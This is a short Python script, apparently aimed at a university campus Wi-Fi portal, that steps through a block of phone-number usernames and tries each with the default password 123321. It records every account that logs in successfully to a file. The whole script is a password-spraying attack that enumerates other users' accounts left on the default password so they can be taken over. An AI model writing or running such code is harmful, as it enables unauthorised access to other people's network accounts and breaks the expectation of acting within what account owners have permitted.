from NuistWifi import certification


def get_username():
    """
    获取默认密码为 123321 的用户名
    """
    output = open("username.txt", "w+")
    username = 18851903109
    password = 123321
    domain = 1

    for i in range(1, 600, 6):
        tele_num = username + i
        status = certification.wlan_login(tele_num, password, domain)
        if "认证成功" in status:
            print(tele_num, file=output)
            print(tele_num)
        certification.wlan_logout()


if __name__ == '__main__':
    get_username()